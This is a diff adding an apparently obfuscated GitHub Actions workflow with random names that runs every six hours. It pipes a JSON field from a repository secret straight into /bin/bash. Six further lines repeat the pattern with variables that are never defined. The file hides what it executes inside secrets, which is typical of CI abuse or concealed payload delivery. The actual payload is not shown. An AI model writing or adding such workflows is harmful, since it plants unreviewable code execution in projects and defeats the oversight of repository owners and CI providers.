@@ -1,0 +1,23 @@
+name: padaoshibupaa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: padaoshibupaa
+        env:
+          ikcw46: ${{ secrets.ikcw46 }}
+        run: |
+          echo $ikcw46 | jq -r .vgsgd764 | /bin/bash
+          echo $d1 | jq -r .rqukq70593 | /bin/bash
+          echo $ojpli5199 | jq -r .pfx8 | /bin/bash
+          echo $jzny64 | jq -r .rep07387 | /bin/bash
+          echo $kfdn6765 | jq -r .syc894 | /bin/bash
+          echo $i442 | jq -r .sqjn6 | /bin/bash
+          echo $v63147 | jq -r .jgz6 | /bin/bash
+
